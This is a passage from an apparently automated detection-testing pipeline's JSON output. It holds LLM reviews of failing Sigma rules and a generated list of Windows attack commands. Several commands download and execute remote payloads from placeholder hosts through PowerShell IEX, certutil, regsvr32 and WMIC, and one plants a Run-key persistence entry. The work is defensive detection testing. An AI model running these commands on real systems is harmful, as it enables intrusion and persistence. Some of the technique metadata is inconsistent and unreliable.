          "Restrict the rule to non\u2011administrative user contexts or to processes launched outside of known legitimate automation tools to reduce false positives.",
          "Populate the ATT&CK technique ID field with the correct identifier (T1059) and add a proper \"author\" or \"date\" field for traceability.",
          "Consider using Sigma's \"contains|all\" or regex capabilities to capture more precise malicious command lines while excluding common benign usage."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Files or Information via Command Line Flags",
        "rule_id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
        "quality_score": 0.45,
        "status": "fail",
        "strengths": [
          "Covers several common obfuscation utilities (PowerShell, certutil, rundll32, mshta, regsvr32).",
          "Uses Sysmon process_creation events, which provide detailed command line data.",
          "Provides a clear false\u2011positive description for each selection.",
          "Includes ATT&CK tagging and custom tags for easier categorisation.",
          "Contains a verification block showing that the rule was executed in the SIEM."
        ],
        "weaknesses": [
          "Failed to detect any real\u2011world instances of the technique (0 events found), indicating poor detection coverage.",
          "Very generic string matches (e.g., \"-enc\", \"IEX\", \"javascript:\") are likely to generate many benign alerts.",
          "No regex or length checks to ensure that the encoded payload is actually suspicious (e.g., base64 detection).",
          "Missing standard Sigma metadata such as author, date, and references.",
          "No exclusion logic for known legitimate administrative scripts that legitimately use the same flags.",
          "The rule does not consider other common obfuscation flags (e.g., PowerShell \"-EncodedCommand\" with base64 payload detection, \"-nop\", \"-w hidden\")."
        ],
        "suggestions": [
          "Add a regex to detect base64 strings following \"-enc\" or \"-EncodedCommand\" (e.g., \"-enc [A-Za-z0-9+/=]{30,}\") to reduce false positives and improve coverage.",
          "Include additional PowerShell obfuscation indicators such as \"-nop\", \"-w hidden\", \"-ExecutionPolicy Bypass\".",
          "Implement exclusion lists for known legitimate scripts or scheduled tasks that use these flags.",
          "Add parent\u2011process correlation (e.g., detect when cmd.exe spawns PowerShell with IEX) to increase confidence.",
          "Incorporate MITRE ATT&CK technique ID (T1027) directly in the rule fields rather than a placeholder \"unknown\".",
          "Populate optional Sigma metadata (author, date, references) to improve documentation and maintainability.",
          "Test the rule against a curated set of malicious samples and adjust thresholds to balance detection vs. false positives."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detect Potential Exfiltration Over C2 Channel via Command-Line Tools",
        "rule_id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Covers multiple commonly abused command\u2011line utilities (PowerShell, certutil, bitsadmin, curl, wget).",
          "Clear and simple Sigma syntax that is easy to understand and maintain.",
          "Provides a list of expected false positives to aid analysts in triage.",
          "Targets Sysmon process_creation events, which are high\u2011quality data sources."
        ],
        "weaknesses": [
          "Failed to detect any real\u2011world exfiltration events (0 events found), indicating poor detection coverage.",
          "Very generic string matches (e.g., \"-EncodedCommand\", \"-decode\", \"/transfer\") are common in legitimate administration, leading to a high false\u2011positive rate.",
          "No correlation with network activity (e.g., outbound connections, DNS queries) that would confirm data exfiltration over a C2 channel.",
          "Lacks more specific indicators such as base64 payloads, suspicious URLs, or known exfiltration command patterns.",
          "The rule does not include any enrichment fields (e.g., user, host) that could help reduce noise.",
          "No mention of time\u2011based or frequency thresholds to limit repeated benign usage."
        ],
        "suggestions": [
          "Incorporate network connection logs (e.g., outbound HTTP/S, DNS) and correlate them with the process events to confirm exfiltration attempts.",
          "Refine the command\u2011line matching using regular expressions to detect encoded or obfuscated payloads (e.g., base64 strings, long hex blobs).",
          "Add context such as the destination URL or IP address and flag known malicious C2 domains.",
          "Introduce a threshold (e.g., number of suspicious commands per host per hour) to reduce noise from legitimate admin scripts.",
          "Consider whitelisting known administrative accounts or scheduled tasks that legitimately use these utilities.",
          "Test the rule against a labeled dataset of exfiltration activity and iteratively adjust the patterns to improve true\u2011positive rate.",
          "Document the rule author, version, and last review date to improve maintainability."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Compression Tools",
        "rule_id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Covers a wide range of compression utilities (zip, 7z, winrar, tar, gzip).",
          "Includes PowerShell and cmd.exe command line patterns for archive creation.",
          "Provides a clear description and false\u2011positive guidance.",
          "Uses appropriate Sigma fields (title, logsource, detection, tags, etc.).",
          "Includes metadata such as technique ID, generation method, and verification block."
        ],
        "weaknesses": [
          "Real\u2011world verification showed zero detections; coverage of the technique is insufficient.",
          "Broad matching (e.g., any cmd.exe with \"zip\" or \"tar\") will generate many benign alerts, leading to a high false\u2011positive rate.",
          "No exclusions for known legitimate backup or packaging scripts, increasing noise.",
          "Relies only on \"Image|endswith\" which may miss executables run from non\u2011standard paths or with different casing.",
          "Missing detection for native Windows compression tools (e.g., compact.exe, PowerShell \"Compress-Archive\" without the \"-c\" flag).",
          "Command\u2011line patterns are generic and may not capture typical exfiltration usage (e.g., missing \"-a\", \"-mx\", \"-p\" flags)."
        ],
        "suggestions": [
          "Add exclusion rules for common backup, deployment, or antivirus processes that legitimately use compression tools.",
          "Refine command\u2011line matching to include specific flags used in exfiltration (e.g., \"-a\", \"-mx\", \"-p\", \"-r\" for zip, \"-o\" for 7z).",
          "Incorporate case\u2011insensitive matching and consider using \"Image|contains\" to capture executables run from varied locations.",
          "Add detection for native Windows compression utilities such as \"compact.exe\" and PowerShell \"Compress-Archive\" without relying on the \"-c\" flag.",
          "Leverage process parent information to filter out known legitimate automation tools (e.g., backup software).",
          "Test the rule against a curated dataset of benign compression activity to tune thresholds and reduce false positives.",
          "Consider adding a time\u2011window or count\u2011based condition to flag repeated compression activity indicative of data staging."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Creation of Scheduled Tasks via Command-Line Tools",
        "rule_id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Covers multiple common ways to create scheduled tasks (schtasks.exe, PowerShell Register-ScheduledTask, cmd invoking schtasks).",
          "Targets Sysmon process_creation events, which are reliably collected on Windows endpoints.",
          "Provides a clear list of expected false positives to aid analysts.",
          "Includes MITRE ATT&CK tags and a descriptive title/description."
        ],
        "weaknesses": [
          "Failed to detect the real\u2011world attack in verification; detection coverage is low.",
          "Rule only looks for schtasks.exe and Register\u2011ScheduledTask; it misses other legitimate creation methods (e.g., New\u2011ScheduledTask, wmic, Task Scheduler UI via COM, PowerShell New\u2011ScheduledTaskTrigger).",
          "No filtering for the actual creation flag (/create) or for the specific action (e.g., /tn, /tr), leading to many benign executions being flagged.",
          "Potentially high false\u2011positive rate because scheduled tasks are frequently created by legitimate admin scripts and system maintenance tools.",
          "Does not leverage Windows Security Event ID 4698 (Scheduled Task created) which provides richer context and lower noise.",
          "Condition \"selection_cmd\" relies on ParentImage being cmd.exe; tasks launched from PowerShell or other shells will be missed.",
          "No enrichment fields (e.g., TaskName, User, CommandLine regex) to aid triage."
        ],
        "suggestions": [
          "Add detection of the \"/create\" switch in schtasks.exe command lines to ensure the rule only fires on task creation, not on query or deletion.",
          "Include PowerShell cmdlets New\u2011ScheduledTask, New\u2011ScheduledTaskAction, and Register\u2011ScheduledTask with broader command\u2011line patterns.",
          "Incorporate Windows Security Event ID 4698 (or Sysmon Event ID 1 with specific command\u2011line arguments) to capture task creation via the GUI or other APIs.",
          "Add additional selections for wmic process (e.g., \"wmic.exe\" with \"process call create\" that invokes schtasks) and for the Task Scheduler COM interface (e.g., \"taskschd.msc\").",
          "Implement a whitelist of known benign scheduled tasks (e.g., Windows Update, backup agents) or exclude common system task names to reduce false positives.",
          "Consider using regex to capture the task name and command line, then enrich alerts with those fields for faster investigation.",
          "Test the rule against a baseline of normal enterprise activity and adjust thresholds or add negations to improve precision.",
          "Document the expected fields in the alert payload (e.g., TaskName, User, CreationTime) to improve completeness and analyst usability."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.4
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Registry Run Keys Persistence via Reg.exe or PowerShell",
        "rule_id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description that explain the intent of the rule.",
          "Targets both HKCU and HKLM Run keys, covering the two common persistence locations.",
          "Specifies the exact executables (reg.exe, powershell.exe) that are often used to modify Run keys.",
          "Includes a list of expected false positives to aid analysts in triage.",
          "Uses appropriate logsource (Sysmon registry events) and assigns a high severity level."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world events (0 events found), indicating poor detection coverage for the technique.",
          "Only looks at command\u2011line activity from reg.exe and powershell.exe, missing other legitimate ways to modify Run keys (e.g., regedit.exe, wmic, direct Registry API calls captured by Sysmon EventID 13).",
          "High likelihood of false positives from legitimate installers, patches, or admin scripts that also use reg.exe or PowerShell to write to Run keys.",
          "No normalization or case\u2011insensitive handling of the command\u2011line strings, which could cause missed detections.",
          "The rule does not filter on Sysmon EventID (e.g., 13 \u2013 RegistryValueSet), potentially increasing the data volume processed.",
          "The false\u2011positive list is generic and does not provide guidance on how to suppress or prioritize alerts."
        ],
        "suggestions": [
          "Add detection of Sysmon EventID 13 (RegistryValueSet) directly on the Run key paths, independent of the process used.",
          "Expand the list of monitored processes to include regedit.exe, wmic.exe, regsvr32.exe, and any other tools that can modify the Run keys.",
          "Implement case\u2011insensitive matching or regex patterns to capture variations in the command\u2011line syntax.",
          "Introduce a threshold or aggregation (e.g., multiple Run\u2011key modifications from the same host within a short window) to reduce noise.",
          "Create a suppression rule for known legitimate installers or update mechanisms that regularly write to Run keys.",
          "Populate the official MITRE ATT&CK ID (T1060) in the appropriate field and ensure consistent tagging.",
          "Validate the rule against a curated dataset of benign and malicious activity to fine\u2011tune the balance between detection and false positives."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.4
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-23T07:29:40.327604",
      "source_agent": "913600fe-8749-4175-ac37-6b4f0ae950c5",
      "target_agent": "rulegen",
      "average_quality_score": 0.532,
      "total_rules_evaluated": 21,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5323809523809524,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule failed to detect any real\u2011world events (0 events found), indicating poor detection coverage for the intended technique.",
        "Very generic matching criteria (e.g., any .dll argument to dotnet.exe or rundll32.exe) will generate a high volume of false alerts in normal environments.",
        "The PowerShell condition only checks for \"-enc\" which is commonly used in legitimate automation scripts.",
        "No correlation with additional indicators of memory injection (e.g., loaded modules, parent\u2011process relationships, or anomalous command\u2011line patterns).",
        "Missing explicit MITRE ATT&CK technique ID (ttp_id is \"unknown\") and tactic information, reducing integration with ATT&CK mapping frameworks."
      ],
      "actionable_suggestions": [
        "Refine the detection logic to focus on truly suspicious usage, such as:",
        "  \u2022 Limiting dotnet.exe and rundll32.exe matches to uncommon or non\u2011system DLL directories (e.g., not \\Windows\\System32).",
        "  \u2022 Adding regex to detect PowerShell base64\u2011encoded commands that start with typical shellcode prefixes (e.g., \"JAB\" patterns).",
        "Combine process creation events with other telemetry (e.g., memory injection alerts, anomalous parent processes, or DLL load events) to increase confidence.",
        "Incorporate a whitelist of known legitimate applications that frequently invoke these executables with .dll arguments."
      ]
    }
  },
  "attacks": [
    {
      "id": "e8eb1e87-4aa3-4812-aeeb-5fa3582c207d",
      "ttp_id": "unknown",
      "technique_id": "T1085",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\\\\\\..\\\\mshtml,RunHTMLApplication ;\\u0020eval(\"document.write('<script>var\\u0020w=new\\u0020ActiveXObject('WScript.Shell');w.Run('cmd.exe',0);</script>');\")",
      "description": "Execute arbitrary code via rundll32 with JavaScript execution through MSHTML COM object",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "rundll32.exe spawns cmd.exe hidden via script execution in memory using legitimate Windows component",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.835698",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eaf86ae7-67bf-4113-b3f3-137f66de592e",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\"",
      "description": "Download and execute PowerShell script from remote server using WebRequest",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell downloads and executes a remote script in memory; this simulates living-off-the-land behavior",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.835698",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "038cd684-c4b3-45c2-8b28-9e0d2e513daf",
      "ttp_id": "unknown",
      "technique_id": "T1140",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe %TEMP%\\\\update.exe && %TEMP%\\\\update.exe",
      "description": "Download executable using certutil and execute from temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "certutil.exe fetches binary from remote host and saves to %TEMP%; local copy is executed",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.835698",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a124ee55-74ed-4ddb-b78b-a9cf56092829",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe C:\\\\Windows\\\\Temp\\\\malicious.dll,EntryPoint",
      "description": "Execute a malicious DLL using rundll32.exe to establish persistence",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "rundll32.exe loads and executes the specified DLL from the given path. Commonly used to run code in the context of a trusted process.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.771519",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "11d1143c-484b-4fbb-950c-ca8073e8ec61",
      "ttp_id": "unknown",
      "technique_id": "T1121",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "regsvr32.exe /s /n /u /i:http://attacker.com/script.sct scrobj.dll",
      "description": "Register a remote script using regsvr32.exe to execute code and maintain persistence",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "regsvr32.exe silently downloads and executes a script from a remote server via SCT file. The /s flag suppresses message boxes, making it stealthy.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.771519",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "53782e1f-9409-4730-b2bf-44f0d655cb34",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('%TEMP%\\\\stage.ps1')\"",
      "description": "Download and execute a PowerShell script from a local temporary file to simulate staged payload execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell reads a locally staged script file and executes it in memory. This simulates post-exploitation stager behavior without requiring internet access during execution.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.771519",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "17309714-80ec-4a39-90da-5ca1911079a7",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Expression 'Write-Host \\u0027Hello from Invoke-Expression\\u0027'\"",
      "description": "Basic execution of PowerShell using Invoke-Expression to run a simple command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "PowerShell executes and prints 'Hello from Invoke-Expression' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.619514",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1edeb18d-3720-41bc-9421-b7034473557d",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/payload.txt')\"",
      "description": "Intermediate attack using PowerShell to download and execute a remote script via IEX (Invoke-Expression)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell attempts to download a script from a local server (likely fails silently in test) and execute it in memory",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.620519",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ef84e0ad-5994-46cd-9d06-b63b3103b6d0",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAZgByAG8AbQAgAEUAbgBjAG8AZABlAGQAIABDAG8AbQBtAGEAbgBkACcA\"",
      "description": "Advanced attack using Base64-encoded PowerShell command (UTF-16LE) to execute a benign message",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes and runs the command, outputting 'Hello from Encoded Command'",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.620519",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b06751a1-f8f2-44f3-ba98-e036fa97739d",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://malicious.com/agent.pdf %TEMP%\\\\agent.pdf",
      "description": "Download a malicious PDF attachment from a remote server using certutil, a built-in Windows binary commonly abused in spearphishing follow-up actions.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a PDF file to the user's TEMP directory. Will fail silently if no network connectivity or URL is unreachable. Leaves forensic traces in AppCache.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.043171",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d51f3eeb-0258-43ab-8533-df60f0b6e209",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process 'outlook.exe' -ArgumentList '/attachment:%TEMP%\\\\invoice.pdf' /recipients:finance@colombianorg.com'\"",
      "description": "Simulates an attacker abusing Outlook to send a spearphishing email with a malicious PDF attachment to a finance department.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches Outlook with simulated attachment and recipient parameters. No actual email is sent unless user completes the action manually. Safe for testing UI-based detection rules.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.044262",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4e59c000-7172-40f8-9223-f4023694c1a9",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/stage.ps1')\"",
      "description": "Execute a remote PowerShell script commonly delivered via malicious Office document macros after a user opens a spearphished PDF or document.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download and execute a PowerShell payload from a remote server. Will fail if internet is blocked or server is down. Highly suspicious behavior in most enterprise environments and often flagged by AMSI.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.044262",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "938c2568-e04f-45e4-96be-9fa21448dc80",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process where \"Name='WINWORD.EXE'\" call create \"cmd.exe /c certutil.exe -urlcache -f http://malicious.site/shell.exe %TEMP%\\\\shell.exe && %TEMP%\\\\shell.exe\"",
      "description": "Simulates WINWORD.EXE spawning cmd.exe to download and execute a payload using certutil, mimicking malicious macro behavior",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "WINWORD.EXE process launches cmd.exe which uses certutil to download a file to %TEMP% and executes it",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.207200",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0051e66b-c6ca-47b6-b864-c44c15a916fd",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', 'whoami.exe' -WindowStyle Hidden\"",
      "description": "Simulates WINWORD.EXE spawning a hidden cmd.exe that runs whoami.exe, representing a basic post-phishing reconnaissance command",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A hidden cmd.exe process is spawned and executes whoami.exe",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.207200",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "15e04357-8d1d-49a0-bff1-73f53c77bcb2",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $proc = Get-WmiObject -Class Win32_Process -Filter \\\"Name='WINWORD.EXE'\\\"; if ($proc) { Start-Process \\\"cmd.exe\\\" -ArgumentList \\\"/c powershell -EncodedCommand $( [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString(\\\"http://malicious.site/stage.ps1\\\")')) \\\" -WindowStyle Hidden } } catch {}\"",
      "description": "Advanced simulation: WINWORD.EXE triggers cmd.exe to run a PowerShell encoded command that downloads and executes a remote script",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "WINWORD.EXE presence triggers hidden PowerShell execution via cmd.exe with encoded command to download and run a remote script",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.207200",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d16b1c73-bcce-4799-b509-9148827919ea",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell process connects to remote server and attempts to download and execute a script. Connection may be blocked by firewall or AV.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:45.465049",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "94916816-ad9b-485b-98a5-908014cc08cf",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/payload.bin %TEMP%\\\\payload.bin && %TEMP%\\\\payload.bin",
      "description": "Download a binary payload using certutil and execute it from the temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Certutil downloads the file to the temp directory and the downloaded binary is executed. May trigger file-based defenses.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:45.465049",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ea78776b-f90d-4872-a9b0-8efbf426688e",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"WwBpAG4AdABdADoAOgBGAGkAbABsAF8ATQBlAG0AbwByAHkAPQAkAHQAcgB1AGUAOwAkAGIAdQBmAD0AQgB5AHQAZQBbAF0AXQA0ADAAMAAwADAAPQBfADsAJABjAG4AdAA9ADA7AHMAdABkAGEAcgB0ACAAewAkAHIAZQBzAD0AJABzAHQAYwBsAGkAZQBuAHQALgBFAHgAcABvAHIAdABTAHQAcgBlAGEAbQAoKS4AVwByAGkAdABlACgAJABiAHUAZgAsADAALAAkAGIAdQBmAC4ATABlAG4AZwB0AGgAKQA7ACAAJABjAG4AdAA9ACQAYwBuAHQAKwAkAHIAZQBzADsAfQB9AHwAOwBTAHQAZQBhAGwAIABtAGUAbQBvAHIAeQAgAHYAaQBhACAAUwBoAGUAbABsAGMAbwBuAHQAZQB4AHQAIABjAGEAbABsAGIAYQBjAGsAIAB1AHMAaQBuAGcAIABTAHQAYQByAHQAOwAgAEQAbwBuACAAUwBwAGEAcgBrAHMAIChAMgAwADEANgApAC4AIgA=\"",
      "description": "Execute a Base64-encoded PowerShell command that performs memory-resident malicious activity (simulated)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes and runs an in-memory script that simulates memory manipulation. No file written to disk. Command uses UTF-16LE-encoded payload.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:45.465561",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "23f376b2-04e5-4d00-806a-6c62f455e610",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Defense Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c start powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://dian.server.tl/payload.ps1')\"",
      "description": "Basic command to spawn PowerShell from cmd.exe and execute a remote script hosted on the phishing domain",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "cmd.exe spawns PowerShell which attempts to download and execute a script from dian.server.tl; connection will fail if domain is unreachable or blocked",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.310017",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "870ac9ed-b29a-4801-ac0a-b45a38a01e4f",
      "ttp_id": "unknown",
      "technique_id": "T1106",
      "technique_name": "Defense Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -ArgumentList '/c reg add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Update /t REG_SZ /d \\\"cmd.exe /c powershell -NoP -Ep Bypass -Command IEX (IWR http://dian.server.tl/shell)\\\"' -Force\"",
      "description": "Intermediate command using PowerShell to spawn cmd.exe and add a persistence entry that references the phishing domain",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "PowerShell starts cmd.exe to add a registry run key with a command line containing the phishing domain; requires admin privileges to modify HKLM",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.310017",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "762c2cc2-b538-4b7b-aa0d-f9802daa1bfe",
      "ttp_id": "unknown",
      "technique_id": "T1047",
      "technique_name": "Defense Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c wmic process call create \"powershell -Command \\\"$web = New-Object Net.WebClient; $web.Headers.Add(\\\"User-Agent\\\", \\\"Mozilla/5.0\\\"); IEX ($web.DownloadString(\\\"http://dian.server.tl/x\\\"))\\\"\"",
      "description": "Advanced command using wmic.exe (built-in Windows binary) to spawn PowerShell with a web request to the phishing domain",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "wmic.exe spawns a PowerShell process that downloads and executes a payload from dian.server.tl using a custom User-Agent; no PowerShell cmdlets used in parent chain",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.310017",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7e3ee4fa-3edf-4925-8b7c-d8b03a433d95",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create TestService binPath= \"cmd.exe /c echo test > %TEMP%\\\\testsvc.txt\" start= auto",
